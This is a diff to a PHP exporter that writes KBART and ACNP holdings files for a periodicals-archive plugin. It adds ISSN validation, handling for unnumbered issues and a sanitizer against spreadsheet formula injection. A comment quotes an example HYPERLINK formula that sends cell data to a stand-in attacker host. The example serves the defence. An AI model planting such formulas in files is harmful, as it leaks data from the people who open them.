@@ -59,6 +59,30 @@ require_once __DIR__ . '/IssnHelper.php';
  *                            held or missing would misstate the holdings
  *   scartato               → neither: a deliberate withdrawal is not a hole
  *   smarrito               → neither, for coherence with consistenzaTestata()
+ *
+ * An issue whose `numero` is empty (the column is NOT NULL but accepts '')
+ * is NOT skipped: it is a real issue on the shelf and consistenzaTestata()
+ * counts it, so it enters the statement under the biblioteconomic marker
+ * `s.n.` (senza numero). Skipping it made an annata holding only unnumbered
+ * issues look empty in the very file the union catalogue ingests.
+ *
+ * ── consistenza_dichiarata (CANONICAL RULE) ───────────────────────────
+ * The curator-written statement is APPENDED to the computed one, separated
+ * by ' · ', and never replaces it — identical to
+ * EmerotecaPlugin::consistenzaTestata(). Replacing it would have dropped
+ * every really-owned issue of that annata from the export; the two
+ * statements answer different questions (what the shelf holds vs. what the
+ * curator declares) and a union catalogue wants both. When there is nothing
+ * computed the declared statement stands alone; when there is neither, the
+ * empty sentinel is '—' (same as consistenzaTestata).
+ *
+ * ── Spreadsheet formula injection ─────────────────────────────────────
+ * Both files are opened in Excel / LibreOffice by the catalogue operator.
+ * RFC-4180 quoting does NOT stop a cell that starts with '=', '+', '-' or
+ * '@' from being evaluated as a formula, so every DATA cell (never the
+ * header, whose spelling is part of the KBART contract) goes through
+ * sanitizeCell() and is prefixed with an apostrophe when it starts with one
+ * of those four characters.
  */
 final class KbartExporter
 {
@@ -120,6 +144,33 @@ final class KbartExporter
     private const ACNP_YEAR_SEPARATOR = ' | ';
 
     /**
+     * Separator between the computed holdings and the curator-written
+     * `consistenza_dichiarata`. Same glue as
+     * EmerotecaPlugin::consistenzaTestata() — the two statements are shown
+     * side by side, never one instead of the other.
+     */
+    private const DECLARED_SEPARATOR = ' · ';
+
+    /** Rendered when an annata holds nothing at all (consistenzaTestata sentinel). */
+    private const EMPTY_HOLDINGS = '—';
+
+    /**
+     * Marker for an issue with no designation at all. Not translated: it is a
+     * data value in a machine-ingested file, and "s.n." is the abbreviation
+     * Italian union catalogues already use for an unnumbered issue.
+     */
+    private const UNNUMBERED_MARKER = 's.n.';
+
+    /**
+     * Per-connection cache of the optional core tables probed by this
+     * exporter. Keyed by handle so two mysqli connections in the same
+     * process (tests) never inherit each other's schema.
+     *
+     * @var array<string, bool>
+     */
+    private static array $tableCache = [];
+
+    /**
      * KBART Phase II TSV export.
      *
      * @param int|null $testataId Restrict to one title; null exports all.
@@ -164,7 +215,8 @@ final class KbartExporter
 
             $cells = [];
             foreach (self::KBART_COLUMNS as $column) {
-                $cells[] = self::oneLine($row[$column]);
+                // Data cells only — the header above is written verbatim.
+                $cells[] = self::sanitizeCell(self::oneLine($row[$column]));
             }
             $out .= implode("\t", $cells) . "\n";
         }
@@ -195,7 +247,8 @@ final class KbartExporter
                 self::testataUrl((int) $testata['id']),
             ];
             $out .= implode(',', array_map(
-                static fn (string $cell): string => self::csvCell(self::oneLine($cell)),
+                // Data cells only — the header above is written verbatim.
+                static fn (string $cell): string => self::csvCell(self::sanitizeCell(self::oneLine($cell))),
                 $cells
             )) . "\n";
         }
@@ -208,10 +261,9 @@ final class KbartExporter
      * ACNP: "1-8, 10-12; lac. 9".
      *
      * Reusable on its own (the admin annata view and the public page want the
-     * same string). Returns '' when the annata has neither holdings nor gaps,
-     * and the curator-written `consistenza_dichiarata` verbatim when present —
-     * that column is the manually declared legacy statement and always wins
-     * over the computed one.
+     * same string). The curator-written `consistenza_dichiarata` is APPENDED
+     * after ' · ', never substituted (see the class docblock); '—' when the
+     * annata has neither holdings, nor gaps, nor a declared statement.
      */
     public static function consistenzaAnnata(mysqli $db, int $annataId): string
     {
@@ -234,7 +286,9 @@ final class KbartExporter
 
         $byAnnata = self::fetchFascicoli($db, [$annataId]);
 
-        return self::consistenzaFromRows($dichiarata, $byAnnata[$annataId] ?? []);
+        $statement = self::consistenzaFromRows($dichiarata, $byAnnata[$annataId] ?? []);
+
+        return $statement === '' ? self::EMPTY_HOLDINGS : $statement;
     }
 
     // ── data collection ───────────────────────────────────────────────
@@ -312,10 +366,18 @@ final class KbartExporter
      */
     private static function fetchTestate(mysqli $db, ?int $testataId): array
     {
+        // `editori` is a core table but the plugin tolerates degraded installs
+        // (AbstractAdminController::tableExists, PublicController). An
+        // unconditional JOIN there made the whole statement fail and the route
+        // answered 200 with a header-only file — which the operator would then
+        // upload to the union catalogue AS THEIR HOLDINGS. Degrade the column,
+        // never the export.
+        $hasEditori = self::tableExists($db, 'editori');
         $sql = 'SELECT t.id, t.titolo, t.issn, t.e_issn, t.issn_l, t.luogo_pubblicazione,
-                       t.periodicita, t.tipo, t.testata_precedente_id, e.nome AS editore_nome
-                  FROM emeroteca_testate t
-                  LEFT JOIN editori e ON e.id = t.editore_id';
+                       t.periodicita, t.tipo, t.testata_precedente_id, '
+             . ($hasEditori ? 'e.nome AS editore_nome' : "'' AS editore_nome")
+             . ' FROM emeroteca_testate t'
+             . ($hasEditori ? ' LEFT JOIN editori e ON e.id = t.editore_id' : '');
         if ($testataId !== null) {
             $sql .= ' WHERE t.id = ?';
         }
@@ -473,17 +535,20 @@ final class KbartExporter
      *
      * Pure numbers collapse into ranges ("1-8"); anything else (e.g. "13-14",
      * "12bis", "S1") cannot be range-collapsed without inventing issues that
-     * may not exist, so it is listed verbatim after the numeric runs. Gaps
-     * follow the same treatment behind "lac.".
+     * may not exist, so it is listed verbatim after the numeric runs. An issue
+     * with no designation at all becomes a single `s.n.` token rather than
+     * disappearing. Gaps follow the same treatment behind "lac.".
+     *
+     * The declared statement is appended, never substituted — see the class
+     * docblock for the canonical rule. Returns '' (the caller decides whether
+     * that is '—' or "omit this year") when there is nothing to say.
      *
      * @param list<array{numero:string, stato:string}> $rows
      */
     private static function consistenzaFromRows(?string $dichiarata, array $rows): string
     {
         $declared = trim((string) $dichiarata);
-        if ($declared !== '') {
-            return self::oneLine($declared);
-        }
+        $declared = $declared !== '' ? self::oneLine($declared) : '';
 
         $ownedInts = [];
         $ownedOther = [];
@@ -493,7 +558,9 @@ final class KbartExporter
         foreach ($rows as $row) {
             $numero = trim($row['numero']);
             if ($numero === '') {
-                continue;
+                // Unnumbered but real: consistenzaTestata() counts it, so the
+                // export must not pretend the shelf is empty.
+                $numero = self::UNNUMBERED_MARKER;
             }
             $isNumeric = preg_match('/^\d+$/', $numero) === 1;
 
@@ -522,14 +589,22 @@ final class KbartExporter
         $gaps  = self::compactList($gapInts, $gapOther);
 
         if ($owned === '' && $gaps === '') {
-            return '';
+            $computed = '';
+        } elseif ($gaps === '') {
+            $computed = $owned;
+        } else {
+            $lacune = 'lac. ' . $gaps;
+            $computed = $owned === '' ? $lacune : $owned . '; ' . $lacune;
         }
-        if ($gaps === '') {
-            return $owned;
-        }
-        $lacune = 'lac. ' . $gaps;
 
-        return $owned === '' ? $lacune : $owned . '; ' . $lacune;
+        if ($computed === '') {
+            return $declared;
+        }
+        if ($declared === '') {
+            return $computed;
+        }
+
+        return $computed . self::DECLARED_SEPARATOR . $declared;
     }
 
     /**
@@ -568,6 +643,9 @@ final class KbartExporter
     /**
      * Owned issue designations of one annata, in natural order.
      *
+     * An unnumbered owned issue still makes the annata part of the coverage
+     * (same reason as consistenzaFromRows): it is on the shelf.
+     *
      * @param  list<array{numero:string, stato:string}> $rows
      * @return list<string>
      */
@@ -579,9 +657,7 @@ final class KbartExporter
                 continue;
             }
             $numero = trim($row['numero']);
-            if ($numero !== '') {
-                $owned[] = $numero;
-            }
+            $owned[] = $numero !== '' ? $numero : self::UNNUMBERED_MARKER;
         }
         $owned = array_values(array_unique($owned));
         usort($owned, [self::class, 'compareIssueNumbers']);
@@ -657,14 +733,61 @@ final class KbartExporter
 
     // ── formatting ────────────────────────────────────────────────────
 
-    /** Canonical hyphenated ISSN, or '' when the column is empty. */
+    /**
+     * Canonical hyphenated ISSN, or '' when the column is empty OR does not
+     * validate.
+     *
+     * Formatting without validating was worse than emitting nothing: a legacy
+     * typo like "12345678" came out as "1234-5678", a perfectly well-formed
+     * ISSN that belongs to a DIFFERENT journal — the knowledge base would then
+     * bind these holdings to somebody else's title. An absent identifier only
+     * costs a match; a wrong one corrupts the union catalogue.
+     *
+     * Deliberately NOT annotated in `notes`: that field is also the ACNP
+     * `consistenza` cell, and a diagnostic message inside the holdings
+     * statement would be ingested as holdings.
+     */
     private static function formatIssn(string $issn): string
     {
         $issn = trim($issn);
         if ($issn === '') {
             return '';
         }
+        if (!IssnHelper::isValidFormat($issn) || !IssnHelper::isValidChecksum($issn)) {
+            return '';
+        }
         return IssnHelper::normalize($issn);
+    }
+
+    /**
+     * True when a core table this exporter can live without is present.
+     * Mirrors AbstractAdminController::tableExists(), cached per connection.
+     */
+    private static function tableExists(mysqli $db, string $table): bool
+    {
+        $key = spl_object_id($db) . '|' . $table;
+        if (array_key_exists($key, self::$tableCache)) {
+            return self::$tableCache[$key];
+        }
+        $exists = false;
+        try {
+            $stmt = $db->prepare(
+                'SELECT COUNT(*) AS c FROM information_schema.TABLES
+                  WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = ?'
+            );
+            if ($stmt !== false) {
+                $stmt->bind_param('s', $table);
+                if ($stmt->execute()) {
+                    $res = $stmt->get_result();
+                    $exists = $res instanceof mysqli_result
+                        && ((int) ($res->fetch_assoc()['c'] ?? 0)) > 0;
+                }
+                $stmt->close();
+            }
+        } catch (\Throwable $e) {
+            $exists = false;
+        }
+        return self::$tableCache[$key] = $exists;
     }
 
     /** Stable local identifier, also used for intra-file title references. */
@@ -692,12 +815,41 @@ final class KbartExporter
      * space. Mandatory for the TSV (a stray TAB shifts every later column
      * into the wrong field) and applied to the CSV too so a row is always
      * one physical line.
+     *
+     * NO /u modifier, on purpose: the character classes are pure ASCII, while
+     * `preg_replace` with /u returns NULL on the first invalid UTF-8 byte —
+     * and `(string) null` is ''. A single latin-1 byte in a legacy title
+     * therefore used to blank out `publication_title` silently. Byte-wise
+     * matching is safe here because no C0 byte can occur inside a UTF-8
+     * multi-byte sequence. The `?? $value` keeps the original text even if
+     * the engine fails for some other reason (backtrack limit).
      */
     private static function oneLine(string $value): string
     {
-        $value = (string) preg_replace('/[\x00-\x1F\x7F]+/u', ' ', $value);
-        $value = (string) preg_replace('/\s{2,}/u', ' ', $value);
+        $value = preg_replace('/[\x00-\x1F\x7F]+/', ' ', $value) ?? $value;
+        $value = preg_replace('/\s{2,}/', ' ', $value) ?? $value;
         return trim($value);
+    }
+
+    /**
+     * Neutralize a spreadsheet formula.
+     *
+     * Both exports are opened in Excel / LibreOffice by the operator of the
+     * union catalogue: a cell starting with '=', '+', '-' or '@' is EVALUATED
+     * there, and RFC-4180 quoting does not change that. A curator-written
+     * `consistenza_dichiarata` such as
+     * `=HYPERLINK("https://evil.tld/?d="&A2,"Apri")` would otherwise reach
+     * that spreadsheet verbatim. Prefixing an apostrophe forces the cell to
+     * text; the apostrophe is not part of the value for a machine loader
+     * reading the raw TSV/CSV either way, and only DATA cells get it — the
+     * header spelling is part of the KBART contract.
+     */
+    private static function sanitizeCell(string $value): string
+    {
+        if ($value !== '' && preg_match('/^[=+\-@]/', $value) === 1) {
+            return "'" . $value;
+        }
+        return $value;
     }
 
     /** RFC 4180 cell: quote when it contains a comma or a double quote. */
